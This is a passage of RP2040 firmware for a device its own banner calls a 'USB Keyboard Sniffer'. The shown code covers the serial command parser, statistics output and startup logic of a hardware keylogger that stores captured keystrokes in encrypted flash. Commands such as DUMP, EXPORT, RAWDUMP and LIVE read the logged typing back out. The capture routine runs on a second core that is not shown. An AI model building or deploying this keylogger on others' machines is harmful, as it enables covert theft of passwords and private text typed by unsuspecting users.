    layout_auto_detected = false;
    Serial.println(i18n->op_erase_done);
    Serial.println(i18n->op_open_mode);
    Serial.flush();
    delete_request = false; operation_active = false;
    setColor(0, 255, 0);
}

static void printLayoutList() {
    Serial.println(i18n->layout_header);
    for (uint8_t i = 0; i < LAYOUT_COUNT; i++) {
        Serial.printf("  %s%-6s  (%u keys)%s\n",
                      (i == getActiveLayoutId()) ? "* " : "  ",
                      layout_registry[i].name, layout_registry[i].map_size,
                      (i == getActiveLayoutId()) ? "  <-- active" : "");
    }
    Serial.println(i18n->layout_footer); Serial.flush();
}

static void executeLayoutChange(const char* name) {
    char upper[12]; uint8_t len = 0;
    for (uint8_t i = 0; name[i] && len < sizeof(upper) - 1; i++)
        upper[len++] = (name[i] >= 'a' && name[i] <= 'z') ? (name[i] - 32) : name[i];
    upper[len] = '\0';
    for (uint8_t i = 0; i < LAYOUT_COUNT; i++) {
        const char* rn = layout_registry[i].name; bool match = true;
        for (uint8_t j = 0; ; j++) {
            char a = (rn[j] >= 'a' && rn[j] <= 'z') ? (rn[j] - 32) : rn[j];
            if (a != upper[j]) { match = false; break; }
            if (a == '\0') break;
        }
        if (match) {
            setActiveLayout(i); cryptoSetLayoutId(i, flashOp);
            layout_auto_detected = true;
            Serial.printf(i18n->layout_changed_to, layout_registry[i].name); Serial.println();
            Serial.flush(); return;
        }
    }
    Serial.printf(i18n->err_unknown_layout, name); Serial.println(); printLayoutList();
}

// =============================================================================
// STATISTICS — With wear counters (E3), nonce floor, Core 1 heartbeat
// =============================================================================

static void printStatistics() {
    uint32_t max_ev = (FLASH_LOG_SIZE / FLASH_PAGE_SIZE) * EVENTS_PER_PAGE;
    uint32_t usage  = (flash_write_offset * 100) / FLASH_LOG_SIZE;
    uint16_t ring_used = (head_idx >= tail_idx) ? (head_idx - tail_idx)
                       : (RAM_BUFFER_SIZE - tail_idx + head_idx);
    uint32_t hb_age = time_us_32() - core1_heartbeat_us;
    bool c1_ok = core1_running && (hb_age < CORE1_HEARTBEAT_TIMEOUT_US);

    Serial.println("--- STATISTICS ---");
    Serial.printf("  Events logged  : %lu\n", events_logged);
    Serial.printf("  Max capacity   : %lu events\n", max_ev);
    Serial.printf("  Flash used     : %lu / %lu bytes (%lu%%)\n",
                  flash_write_offset, (uint32_t)FLASH_LOG_SIZE, usage);
    Serial.printf("  Log wrapped    : %s\n", has_wrapped ? "YES" : "NO");
    Serial.printf("  Crypto status  : %s\n",
                  cryptoIsUnlocked() ? "UNLOCKED (capturing)" : "LOCKED");
    Serial.printf("  Password mode  : %s\n",
                  cryptoHasUserPassword() ? "USER PASSWORD SET" : "OPEN");
    Serial.printf("  Layout         : %s\n", layout_registry[getActiveLayoutId()].name);
    Serial.printf("  Nonce counter  : %lu\n", nonce_counter);
    Serial.printf("  Nonce floor    : %lu\n", (unsigned long)nonce_floor);
    Serial.printf("  Ring buffer    : %u / %u\n", ring_used, (uint16_t)RAM_BUFFER_SIZE);
    Serial.printf("  Ring overflows : %lu\n", (unsigned long)overflow_count);
    Serial.printf("  USB packets    : %lu total, %lu HID\n",
                  (unsigned long)usb_packets_total, (unsigned long)usb_packets_hid);
    Serial.printf("  Page buffer    : %u / %u\n", page_event_count, (uint8_t)EVENTS_PER_PAGE);
    Serial.printf("  Meta slot      : %u / %u\n", meta_slot_idx, (uint8_t)META_ENTRIES_MAX);
    Serial.printf("  Boot uptime    : %lu ms\n", millis());
    Serial.printf("  Session #      : %u\n", session_counter);
    Serial.printf("  Read PIN       : %s\n", cryptoHasReadPin() ? "SET" : "not set");
    Serial.printf("  Live mode      : %s\n", live_mode_active ? (live_clean_mode ? "ON (CLEAN)" : "ON") : "OFF");
    if (cryptoHasUserPassword()) Serial.printf("  Login failures : %u\n", login_attempts);
    if (cryptoHasReadPin())      Serial.printf("  PIN failures   : %u\n", rpin_attempts);
    Serial.printf("  Core 1         : %s\n", c1_ok ? "HEALTHY" : "WARNING — no heartbeat!");
    if (core1_running) Serial.printf("  Core 1 HB age  : %lu us\n", hb_age);
    Serial.printf("  Flash wear     : meta=%lu erases, log=%lu erases (this boot)\n",
                  (unsigned long)flash_wear_meta_erases, (unsigned long)flash_wear_log_erases);
    Serial.printf("  Firmware CRC32 : 0x%08lX\n", (unsigned long)boot_fw_crc32);
    uint32_t stored_crc = cryptoGetFwCrc();
    if (stored_crc != 0xFFFFFFFF) {
        Serial.printf("  Stored FW CRC  : 0x%08lX %s\n", (unsigned long)stored_crc,
                      (stored_crc == boot_fw_crc32) ? "(OK)" : "(MISMATCH!)");
    }
    if (user_epoch_seconds > 0) {
        uint32_t now_epoch = user_epoch_seconds + (millis() - epoch_set_millis) / 1000;
        Serial.printf("  User epoch     : %lu\n", (unsigned long)now_epoch);
    }
    Serial.println("--- END ---"); Serial.flush();
}

// =============================================================================
// HELP COMMAND — Context-sensitive (U2: STATUS alias handled in parser)
// =============================================================================

static void printHelpLine(const char* cmd, const char* args, const char* desc) {
    char left[28];
    snprintf(left, sizeof(left), "%s %s", cmd, args);
    Serial.printf("  %-24s%s\n", left, desc);
}

static void printHelp() {
    if (cryptoHasUserPassword()) {
        Serial.println(i18n->help_header_locked);
        printHelpLine("LOGIN",  i18n->arg_password,  i18n->help_desc_login);
        printHelpLine("DUMP",   i18n->arg_password,  i18n->help_desc_dump);
        printHelpLine("HEX",    i18n->arg_password,  i18n->help_desc_hex);
        printHelpLine("EXPORT", i18n->arg_password,  i18n->help_desc_export);
        printHelpLine("RAWDUMP",i18n->arg_password,  i18n->help_desc_rawdump);
        printHelpLine("PASS",   i18n->arg_old_new,   i18n->help_desc_pass);
        printHelpLine("UNLOCK", i18n->arg_password,  i18n->help_desc_unlock);
    } else {
        Serial.println(i18n->help_header_open);
        printHelpLine("DUMP",   "[pin]",  i18n->help_desc_dump);
        printHelpLine("HEX",    "[pin]",  i18n->help_desc_hex);
        printHelpLine("EXPORT", "[pin] [N]",  i18n->help_desc_export);
        printHelpLine("RAWDUMP","[pin]",  i18n->help_desc_rawdump);
        printHelpLine("LOCK",   i18n->arg_password,  i18n->help_desc_lock);
        printHelpLine("RPIN",   "SET/CLEAR <pin>",   i18n->help_desc_rpin_set);
    }
    printHelpLine("LAYOUT", "[name]",  i18n->help_desc_layout);
    printHelpLine("LANG",   "[code]",  i18n->help_desc_lang);
    printHelpLine("LIVE",   "[CLEAN]", i18n->help_desc_live);
    printHelpLine("TIME",   "<epoch>", i18n->help_desc_time);
    printHelpLine("DEL",    "CONFIRM", i18n->help_desc_del);
    printHelpLine("STOP",   "",        i18n->help_desc_stop);
    printHelpLine("STAT",   "",        i18n->help_desc_stat);
    printHelpLine("HELP",   "",        i18n->help_desc_help);
    Serial.flush();
}

// =============================================================================
// SERIAL COMMAND PARSER — R4 (uint16_t), S2 (scrub), U2/U3/U4
// =============================================================================

static char cmd_buffer[CMD_BUFFER_SIZE];
static uint8_t cmd_idx = 0;

/** @brief R4 fix: uint16_t loop counter instead of uint8_t. */
static uint8_t tokenize(char* str, char** tokens, uint8_t max_tokens) {
    uint8_t count = 0;
    bool in_token = false;
    for (uint16_t i = 0; str[i] != '\0' && count < max_tokens; i++) {
        if (str[i] == ' ') { str[i] = '\0'; in_token = false; }
        else if (!in_token) { tokens[count++] = &str[i]; in_token = true; }
    }
    return count;
}

static void toUpperInPlace(char* str) {
    for (uint16_t i = 0; str[i]; i++) {
        if (str[i] >= 'a' && str[i] <= 'z') str[i] -= 32;
    }
}

static bool validatePasswordLength(const char* token) {
    if (strlen(token) > PASSWORD_MAX_LEN) {
        Serial.printf(i18n->err_pwd_too_long, (unsigned)PASSWORD_MAX_LEN); Serial.println();
        return false;
    }
    return true;
}

/** @brief S2: Scrub the command buffer (wipes passwords/PINs from RAM). */
static void scrubCmdBuffer() {
    secure_memzero(cmd_buffer, CMD_BUFFER_SIZE);
}

static void processSerialCommands() {
    while (Serial.available()) {
        char c = Serial.read();

        if (c == '\n' || c == '\r') {
            if (cmd_overflow) {
                Serial.println(i18n->err_cmd_too_long);
                cmd_idx = 0; cmd_overflow = false; continue;
            }
            if (cmd_idx == 0) continue;
            cmd_buffer[cmd_idx] = '\0';

            char* tokens[4];
            uint8_t tc = tokenize(cmd_buffer, tokens, 4);
            if (tc == 0) { cmd_idx = 0; continue; }
            toUpperInPlace(tokens[0]);

            if (strcmp(tokens[0], "STOP") == 0) {
                cancel_request = true; cmd_idx = 0; continue;
            }
            if (operation_active) {
                Serial.println(i18n->op_busy);
                cmd_idx = 0; continue;
            }

            // --- Dispatch ---
            bool needs_scrub = false;
            if (strcmp(tokens[0], "HELP") == 0) {
                printHelp();
            } else if (strcmp(tokens[0], "TIME") == 0) {
                if (tc < 2) {
                    if (user_epoch_seconds > 0) {
                        uint32_t now = user_epoch_seconds + (millis() - epoch_set_millis) / 1000;
                        Serial.printf(i18n->info_epoch, (unsigned long)now); Serial.println();
                    } else {
                        Serial.println(i18n->usage_time);
                    }
                } else {
                    user_epoch_seconds = (uint32_t)strtoul(tokens[1], nullptr, 10);
                    epoch_set_millis   = millis();
                    Serial.printf(i18n->op_time_set, (unsigned long)user_epoch_seconds); Serial.println();
                }
            } else if (strcmp(tokens[0], "LIVE") == 0) {
                if (live_mode_active) {
                    live_mode_active = false;
                    live_clean_mode  = false;
                    Serial.println(i18n->live_off);
                } else {
                    live_mode_active = true;
                    if (tc >= 2) {
                        toUpperInPlace(tokens[1]);
                        live_clean_mode = (strcmp(tokens[1], "CLEAN") == 0);
                    } else {
                        live_clean_mode = false;
                    }
                    Serial.print(i18n->live_on);
                    if (live_clean_mode) Serial.print(" (CLEAN)");
                    Serial.println();
                    if (!cryptoIsUnlocked()) Serial.println(i18n->live_warn_locked);
                }

            } else if (strcmp(tokens[0], "LOGIN") == 0) {
                needs_scrub = true;
                if (!cryptoHasUserPassword()) Serial.println(i18n->info_no_pwd);
                else if (cryptoIsUnlocked()) Serial.println(i18n->info_already_unlocked);
                else if (tc < 2) Serial.printf("[USAGE] LOGIN %s\n", i18n->arg_password);
                else if (!validatePasswordLength(tokens[1])) { /* printed */ }
                else executeLogin(tokens[1]);

            } else if (strcmp(tokens[0], "DUMP") == 0) {
                needs_scrub = true;
                if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (cryptoHasUserPassword() && tc < 2) Serial.printf("[USAGE] DUMP %s\n", i18n->arg_password);
                else if (!cryptoHasUserPassword() && cryptoHasReadPin() && tc < 2) Serial.printf("[USAGE] DUMP %s\n", i18n->arg_pin);
                else executeTextDump(tc >= 2 ? tokens[1] : nullptr);

            } else if (strcmp(tokens[0], "HEX") == 0) {
                needs_scrub = true;
                if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (cryptoHasUserPassword() && tc < 2) Serial.printf("[USAGE] HEX %s\n", i18n->arg_password);
                else if (!cryptoHasUserPassword() && cryptoHasReadPin() && tc < 2) Serial.printf("[USAGE] HEX %s\n", i18n->arg_pin);
                else executeHexDump(tc >= 2 ? tokens[1] : nullptr);

            } else if (strcmp(tokens[0], "EXPORT") == 0) {
                needs_scrub = true;
                if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (cryptoHasUserPassword() && tc < 2) Serial.printf("[USAGE] EXPORT %s [N]\n", i18n->arg_password);
                else if (!cryptoHasUserPassword() && cryptoHasReadPin() && tc < 2) Serial.printf("[USAGE] EXPORT %s [N]\n", i18n->arg_pin);
                else {
                    const char* cred = (tc >= 2) ? tokens[1] : nullptr;
                    uint32_t last_n = 0;
                    if (tc >= 3) last_n = (uint32_t)atol(tokens[2]);
                    else if (tc == 2 && !cryptoHasUserPassword() && !cryptoHasReadPin()) {
                        last_n = (uint32_t)atol(tokens[1]);
                        if (last_n > 0) cred = nullptr;
                    }
                    executeExport(cred, last_n);
                }
            } else if (strcmp(tokens[0], "RAWDUMP") == 0) {
                needs_scrub = true;
                if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (cryptoHasUserPassword() && tc < 2) Serial.printf("[USAGE] RAWDUMP %s\n", i18n->arg_password);
                else if (!cryptoHasUserPassword() && cryptoHasReadPin() && tc < 2) Serial.printf("[USAGE] RAWDUMP %s\n", i18n->arg_pin);
                else executeRawDump(tc >= 2 ? tokens[1] : nullptr);

            } else if (strcmp(tokens[0], "RPIN") == 0) {
                needs_scrub = true;
                if (tc < 3) {
                    Serial.println(i18n->usage_rpin);
                    Serial.printf(i18n->info_rpin_status, cryptoHasReadPin() ? "SET" : "---"); Serial.println();
                } else {
                    toUpperInPlace(tokens[1]);
                    if (strcmp(tokens[1], "SET") == 0) executeSetReadPin(tokens[2]);
                    else if (strcmp(tokens[1], "CLEAR") == 0) executeClearReadPin(tokens[2]);
                    else Serial.println(i18n->usage_rpin);
                }

            } else if (strcmp(tokens[0], "LOCK") == 0) {
                needs_scrub = true;
                if (cryptoHasUserPassword()) Serial.println(i18n->err_already_locked);
                else if (tc < 2) { Serial.printf("[USAGE] LOCK %s\n", i18n->arg_password); Serial.println(i18n->info_capture_will_pause); }
                else if (!validatePasswordLength(tokens[1])) { /* printed */ }
                else executeLock(tokens[1]);

            } else if (strcmp(tokens[0], "UNLOCK") == 0) {
                needs_scrub = true;
                if (!cryptoHasUserPassword()) Serial.println(i18n->err_already_open);
                else if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (tc < 2) Serial.printf("[USAGE] UNLOCK %s\n", i18n->arg_password);
                else if (!validatePasswordLength(tokens[1])) { /* printed */ }
                else executeUnlock(tokens[1]);

            } else if (strcmp(tokens[0], "PASS") == 0) {
                needs_scrub = true;
                if (!cryptoHasUserPassword()) Serial.println(i18n->info_no_pwd);
                else if (!cryptoIsUnlocked()) Serial.println(i18n->err_locked);
                else if (tc < 3) Serial.printf("[USAGE] PASS %s\n", i18n->arg_old_new);
                else if (!validatePasswordLength(tokens[1]) || !validatePasswordLength(tokens[2])) { /* printed */ }
                else executePasswordChange(tokens[1], tokens[2]);

            } else if (strcmp(tokens[0], "DEL") == 0) {
                if (tc >= 2) { toUpperInPlace(tokens[1]);
                    if (strcmp(tokens[1], "CONFIRM") == 0) executeErase();
                    else Serial.println(i18n->safety_del);
                } else { Serial.println(i18n->safety_del); }
            } else if (strcmp(tokens[0], "STAT") == 0 || strcmp(tokens[0], "STATUS") == 0) {
                printStatistics();

            } else if (strcmp(tokens[0], "LAYOUT") == 0) {
                if (tc < 2) printLayoutList();
                else executeLayoutChange(tokens[1]);

            // --- LANG [code] — Interface language selection ---
            } else if (strcmp(tokens[0], "LANG") == 0) {
                if (tc < 2) {
                    // List available languages
                    Serial.println(i18n->lang_header);
                    for (uint8_t li = 0; li < LANG_COUNT; li++) {
                        Serial.printf("  %s%-5s  %s%s\n",
                            (li == getActiveLangId()) ? "* " : "  ",
                            lang_registry[li].code,
                            lang_registry[li].name,
                            (li == getActiveLangId()) ? "  <--" : "");
                    }
                    Serial.println(i18n->layout_footer);
                } else {
                    // Search by code (case-insensitive)
                    char lup[8]; uint8_t llen = 0;
                    for (uint8_t j = 0; tokens[1][j] && llen < 7; j++)
                        lup[llen++] = (tokens[1][j] >= 'a' && tokens[1][j] <= 'z')
                                    ? (tokens[1][j] - 32) : tokens[1][j];
                    lup[llen] = '\0';
                    bool lfound = false;
                    for (uint8_t li = 0; li < LANG_COUNT; li++) {
                        if (strcmp(lup, lang_registry[li].code) == 0) {
                            setActiveLanguage(li);
                            cryptoSetLangId(li, flashOp);
                            Serial.printf(i18n->lang_changed, lang_registry[li].name);
                            Serial.println();
                            lfound = true;
                            break;
                        }
                    }
                    if (!lfound) Serial.println(i18n->lang_unknown);
                }

            } else {
                Serial.printf("%s: '%s'\n", i18n->err_unknown_cmd, tokens[0]);
            }
            if (needs_scrub) scrubCmdBuffer();
            cmd_idx = 0;
        }
        else if (cmd_idx < sizeof(cmd_buffer) - 1 && c >= 0x20) { cmd_buffer[cmd_idx++] = c; }
        else if (c >= 0x20) { cmd_overflow = true; }
    }
}

// =============================================================================
// ARDUINO ENTRY POINTS — CORE 0
// =============================================================================

void setup() {
    set_sys_clock_khz(120000, true);
    Serial.begin(115200);
    watchdog_enable(8000, true);

#if HAS_NEOPIXEL
    pixels.begin(); pixels.setBrightness(50);
#endif
    setColor(255, 165, 0);
    boot_fw_crc32 = calcCRC32((const uint8_t*)XIP_BASE, FW_CRC_SIZE);

    bool auto_unlocked = cryptoInit(flashOp);
    if (auto_unlocked) cryptoSetFwCrc(boot_fw_crc32, flashOp);

    if (!auto_unlocked) {
        char build_pwd[CRYPTO_BUILD_PWD_LEN + 1];
        cryptoGetBuildPassword(build_pwd);
        auto_unlocked = cryptoUnlock(build_pwd);
        secure_memzero(build_pwd, sizeof(build_pwd));
    }
    if (auto_unlocked) injectSessionMarker();

    setActiveLayout(cryptoGetLayoutId());
    setActiveLanguage(cryptoGetLangId());

    if (!recoverFromMetadata()) { recoverByScan(); persistMetadata(); }
    detectWraparound();
    last_flush_ms = millis();

    unsigned long start = millis();
    while (!Serial && millis() - start < 3000) {
        watchdog_update(); setColor(255, 165, 0); delay(100); setColor(0, 0, 0); delay(100);
    }

    if (Serial) {
        Serial.println();
        Serial.println("====================================================");
        Serial.println(" USB Keyboard Sniffer v1.0.0 (Encrypted, Passive)");
        Serial.println("====================================================");
        Serial.printf(" Flash log   : %lu events\n", events_logged);
        Serial.printf(" Write pos   : 0x%08lX / 0x%08lX\n", flash_write_offset, (uint32_t)FLASH_LOG_SIZE);
        Serial.printf(" Layout      : %s\n", layout_registry[getActiveLayoutId()].name);
        Serial.printf(" FW CRC32    : 0x%08lX", (unsigned long)boot_fw_crc32);
        uint32_t stored_fw = cryptoGetFwCrc();
        if (stored_fw != 0xFFFFFFFF && stored_fw != boot_fw_crc32)
            Serial.println(" [!!! MISMATCH !!!]");
        else Serial.println(" (OK)");

        if (auto_unlocked && !cryptoHasUserPassword()) Serial.println(i18n->boot_mode_open);
        else if (auto_unlocked) Serial.println(i18n->boot_auto_unlocked);
        else Serial.println(i18n->boot_mode_locked);
        Serial.println(i18n->boot_type_help);
        Serial.println();
    }

    setColor(cryptoIsUnlocked() ? 0 : 255, cryptoIsUnlocked() ? 255 : 165, 0);
}

void loop() {
    watchdog_update();
    processWriteQueue(false);

    if (cryptoIsUnlocked() && page_event_count >= FLUSH_MIN_EVENTS) {
        uint32_t now = millis();
        if ((now - last_flush_ms) >= FLUSH_INTERVAL_MS) {
            processWriteQueue(true);
            last_flush_ms = now;
        }
    } else if (page_event_count == 0) {
        last_flush_ms = millis();
    }

    processSerialCommands();
}

void setup1() { setupSnifferCore1(); runSnifferCore1(); }
void loop1()  { /* unreachable */ }
